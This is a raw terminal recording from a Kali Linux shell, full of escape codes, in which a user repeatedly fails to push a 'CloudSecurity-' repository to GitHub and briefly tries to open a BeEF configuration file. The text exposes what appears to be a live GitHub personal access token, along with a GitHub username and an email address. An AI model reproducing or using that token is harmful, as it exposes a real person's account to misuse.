[96m# [m[38;5;81mChanges to be committed:[m
[96m#       [m[38;5;121mmodified[m[96m: [m[95m  .viminfo[m
[96m#       [m[38;5;121mmodified[m[96m: [m[95m  typescript1[m
[96m#       [m[38;5;121mmodified[m[96m: [m[95m  typescript2[m
[96m#[m
[94m~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,0-1[9CAll"~/.git/COMMIT_EDITMSG" 10L, 262C[1;1H[?25h[?25l[24;52H^[[1;1H[24;52H  [1;1H[24;52H^[[1;1H[24;52H  [1;1H[?25h[?25l[24;52H:[1;1H[24;1H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25h[?25l[?1006l[?1002l[?2004l".git/COMMIT_EDITMSG" 10L, 262C written[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t
[?2004l[?1l>[?25h[?1049l[23;0;0t[KAborting commit due to empty commit message.
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin ama[K[K[Kmaster
fatal: 'github.com/harksu/CloudSecurity' does not appear to be a git repository
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remote remove origin
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remote add origin https://github.com/harksu/CloudSecurity-.g it
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remote -0[K[K-v
origin	https://github.com/harksu/CloudSecurity-.git (fetch)
origin	https://github.com/harksu/CloudSecurity-.git (push)
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git status
On branch master2
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

	[32mmodified:   .viminfo[m
	[32mmodified:   typescript1[m
	[32mmodified:   typescript2[m

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	[31mmodified:   .viminfo[m
	[31mmodified:   typescript1[m
	[31mmodified:   typescript2[m

]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin amste[K[K[K[Km[K[Kmaster
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 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[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ci[K
bash: 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: command not found
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 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[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[18Pit push origin master
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.
remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master[K[K[K[Kin
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ /etc/beef-xss/cof[Knfig.yaml
bash: /etc/beef-xss/config.yaml: Permission denied
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ sudo /etc/beef-xss/config.yaml

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for user01: 
user01 is not in the sudoers file.  This incident will be reported.
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ su [K[K[Ksudo su [K[K[K[K[K[K[K[Ksu sudo[K[K[K[Kroot
Password: 
]0;root@kali: /home/user01[01;31mroot@kali[00m:[01;34m/home/user01[00m# /etc [K/beef-xss/config.yaml
bash: /etc/beef-xss/config.yaml: Permission denied
]0;root@kali: /home/user01[01;31mroot@kali[00m:[01;34m/home/user01[00m# eixt
bash: eixt: command not found
]0;root@kali: /home/user01[01;31mroot@kali[00m:[01;34m/home/user01[00m# exit
exit
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ sudo [K[K[K[K[Ksudo [K[K[K[K[Ksu -u s[Kroot
Try 'su --help' for more information.
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ su - root [K
Password: 
]0;root@kali: ~[01;31mroot@kali[00m:[01;34m~[00m# /etc/beef-xss/config-[K.yaml
-bash: /etc/beef-xss/config.yaml: Permission denied
]0;root@kali: ~[01;31mroot@kali[00m:[01;34m~[00m# sudo[K[K - user01
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git status
On branch master2
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

	[32mmodified:   .viminfo[m
	[32mmodified:   typescript1[m
	[32mmodified:   typescript2[m

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	[31mmodified:   .viminfo[m
	[31mmodified:   typescript1[m
	[31mmodified:   typescript2[m

]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git [K[K[K[Kgit branch
[?1h=  main[m[m
  master[m[m
* [32mmaster2[m[m
[K[?1l>]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git checkout master
error: Your local changes to the following files would be overwritten by checkout:
	.viminfo
	typescript1
	typescript2
Please commit your changes or stash them before you switch branches.
Aborting
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git add [K[K[K[K[K[K[K[K
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git ch[K[K[K[K[K[Kgit cmo[K[K[K[K[K[K[Kgit add .
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git cmo[K[Kommit -m ":st"
[master2 3fe187e] :st
 3 files changed, 847 insertions(+), 349 deletions(-)
 rewrite .viminfo (66%)
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git config ==u[K[K[K--unset credenta[Kial.helper
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master
Username for 'https://github.com': harsku      harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git config -- gl[K[K[Kgl[K[K global/[K.name harksu
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git config -- global [K.email harksulim@naver.com
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git rmoet [K[K[K[K[Kemote -v 
origin	https://github.com/harksu/CloudSecurity-.git (fetch)
origin	https://github.com/harksu/CloudSecurity-.git (push)
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git inti[K[Kit
Reinitialized existing Git repository in /home/user01/.git/
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ cd /home/user01/.git/
]0;user01@kali: ~/.git[01;31muser01@kali[00m:[01;34m~/.git[00m$ ls
[0m[01;34mbranches[0m        config       HEAD   index  [01;34mlogs[0m     packed-refs
COMMIT_EDITMSG  description  [01;34mhooks[0m  [01;34minfo[0m   [01;34mobjects[0m  [01;34mrefs[0m
]0;user01@kali: ~/.git[01;31muser01@kali[00m:[01;34m~/.git[00m$ git in[K[K[K[K[K[Kvi info
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"info" is a directory[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[34m" ============================================================================
" Netrw Directory Listing                                        [m[36m(netrw v156)[m
[34m"   /home/user01/.git/info
"   Sorted by[m[38;5;130m      name[m
[34m"   Sort sequence:[m[38;5;130m [\/]$[m[34m,[m[38;5;130m\<core\%(\.\d\+\)\=\>[m[34m,[m[38;5;130m\.h$[m[34m,[m[38;5;130m\.c$[m[34m,[m[38;5;130m\.cpp$[m[34m,[m[38;5;130m\~\=\*$[m[34m,[m[38;5;130m*[m[34m,[m[38;5;130m\.o$[m[34m,[6;1H"   Quick Help: [m[36m<F1>[m[35m:[mhelp  [36m-[m[35m:[mgo up dir  [36mD[m[35m:[mdelete  [36mR[m[35m:[mrename  [36ms[m[35m:[msort-by  [36mx[m[35m:[mspecia[7;1H[34m" =============================================================================[m[8;1H[4m[34m..[m[4m[36m/[m[4m                                                                            [m[9;1H[34m.[m[36m/[m
exclude
[94m~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H8,1[11CAll[8;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H[96m" ============================================================================
" Netrw Directory Listing                                        [m[1m[96m(netrw v156)[m
[96m"   /home/user01/.git/info
"   Sorted by[m[93m      name[m
[96m"   Sort sequence:[m[93m [\/]$[m[96m,[m[93m\<core\%(\.\d\+\)\=\>[m[96m,[m[93m\.h$[m[96m,[m[93m\.c$[m[96m,[m[93m\.cpp$[m[96m,[m[93m\~\=\*$[m[96m,[m[93m*[m[96m,[m[93m\.o$[m[96m,[6;1H"   Quick Help: [m[1m[96m<F1>[m[38;5;224m:[mhelp  [1m[96m-[m[38;5;224m:[mgo up dir  [1m[96mD[m[38;5;224m:[mdelete  [1m[96mR[m[38;5;224m:[mrename  [1m[96ms[m[38;5;224m:[msort-by  [1m[96mx[m[38;5;224m:[mspecia[7;1H[96m" =============================================================================[m[8;1H[4m[38;5;159m..[m[1m[4m[96m/[m[4m                                                                            [m[9;1H[38;5;159m.[m[1m[96m/[m
exclude
[94m~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H8,1[11CAll"info" is a directory[8;1H[?25h[?25l[24;52H^[[8;1H[24;52H  [8;1H[24;52H^[[8;1H[24;52H  [8;1H[?25h[?25l[24;52H:[8;1H[24;1H[K[24;1H:[?2004h[?25hq[?25l[?25h![?25l[?25h[?25l[?1006l[?1002l[?2004l[?1006h[?1002h[?2004h[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~/.git[01;31muser01@kali[00m:[01;34m~/.git[00m$ vi logs
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"logs" is a directory[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[34m" ============================================================================
" Netrw Directory Listing                                        [m[36m(netrw v156)[m
[34m"   /home/user01/.git/logs
"   Sorted by[m[38;5;130m      name[m
[34m"   Sort sequence:[m[38;5;130m [\/]$[m[34m,[m[38;5;130m\<core\%(\.\d\+\)\=\>[m[34m,[m[38;5;130m\.h$[m[34m,[m[38;5;130m\.c$[m[34m,[m[38;5;130m\.cpp$[m[34m,[m[38;5;130m\~\=\*$[m[34m,[m[38;5;130m*[m[34m,[m[38;5;130m\.o$[m[34m,[6;1H"   Quick Help: [m[36m<F1>[m[35m:[mhelp  [36m-[m[35m:[mgo up dir  [36mD[m[35m:[mdelete  [36mR[m[35m:[mrename  [36ms[m[35m:[msort-by  [36mx[m[35m:[mspecia[7;1H[34m" =============================================================================[m[8;1H[4m[34m..[m[4m[36m/[m[4m                                                                            [m[9;1H[34m.[m[36m/[m
[34mrefs[m[36m/[m
HEAD
[94m~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H8,1[11CAll[8;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H[96m" ============================================================================
" Netrw Directory Listing                                        [m[1m[96m(netrw v156)[m
[96m"   /home/user01/.git/logs
"   Sorted by[m[93m      name[m
[96m"   Sort sequence:[m[93m [\/]$[m[96m,[m[93m\<core\%(\.\d\+\)\=\>[m[96m,[m[93m\.h$[m[96m,[m[93m\.c$[m[96m,[m[93m\.cpp$[m[96m,[m[93m\~\=\*$[m[96m,[m[93m*[m[96m,[m[93m\.o$[m[96m,[6;1H"   Quick Help: [m[1m[96m<F1>[m[38;5;224m:[mhelp  [1m[96m-[m[38;5;224m:[mgo up dir  [1m[96mD[m[38;5;224m:[mdelete  [1m[96mR[m[38;5;224m:[mrename  [1m[96ms[m[38;5;224m:[msort-by  [1m[96mx[m[38;5;224m:[mspecia[7;1H[96m" =============================================================================[m[8;1H[4m[38;5;159m..[m[1m[4m[96m/[m[4m                                                                            [m[9;1H[38;5;159m.[m[1m[96m/[m
[38;5;159mrefs[m[1m[96m/[m
HEAD
[94m~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H8,1[11CAll"logs" is a directory[8;1H[?25h[?25l[?25h[?25l[?25h[?25l[1;23r[1;1H[3M[1;24r[5;1H[38;5;159m..[m[1m[96m/[m[5;4H[K[6;1H[4m[38;5;159m.[m[1m[4m[96m/[m[4m                                                                             [m[21;1H[94m~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;1H[K[24;62H9,1[11CBot[6;1H[?25h[?25l[1;23r[1;1H[3M[1;24r[3;1H[38;5;159m.[m[1m[96m/[m[3;3H[K[5;1H[4mHEAD                                                                           [m[21;1H[94m~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H[K[24;62H11,1[10CBot[5;1H[?25h[?25l[24;52H^[[5;1H[24;52H  [5;1H[24;52H^[[5;1H[24;52H  [5;1H[?25h[?25l[24;52H:[5;1H[24;52H[K[24;1H:[?2004h[?25hq[?25l[?25h![?25l[?25h[?25l[?1006l[?1002l[?2004l[?1006h[?1002h[?2004h[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~/.git[01;31muser01@kali[00m:[01;34m~/.git[00m$ cd ..
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
genA1.py  input1.txt  [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
genA2.py  input2.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git status
On branch master2
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	[31mmodified:   .viminfo[m
	[31mmodified:   typescript1[m
	[31mmodified:   typescript2[m

Untracked files:
  (use "git add <file>..." to include in what will be committed)

	[31m.vim/[m

no changes added to commit (use "git add" and/or "git commit -a")
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gut add .
-bash: gut: command not found
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git add.
git: 'add.' is not a git command. See 'git --help'.

The most similar command is
	add
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$  git add .
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git stuats
git: 'stuats' is not a git command. See 'git --help'.

The most similar command is
	status
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git stau[Ktus
On branch master2
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

	[32mnew file:   .vim/.netrwhist[m
	[32mmodified:   .viminfo[m
	[32mmodified:   typescript1[m
	[32mmodified:   typescript2[m

]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git cmo[K[Kopmm[K[K[Kmmit -m"jebla"
[master2 8281ff6] jebla
 4 files changed, 362 insertions(+), 161 deletions(-)
 create mode 100644 .vim/.netrwhist
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git status
On branch master2
nothing to commit, working tree clean
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git stauts[K[K[K[Katus
On branch master2
nothing to commit, working tree clean
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master 
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git reste[K[Kete[K HEAD
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git stau[Ktus
On branch master2
nothing to commit, working tree clean
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git cehckout[K[K[K[K[K[K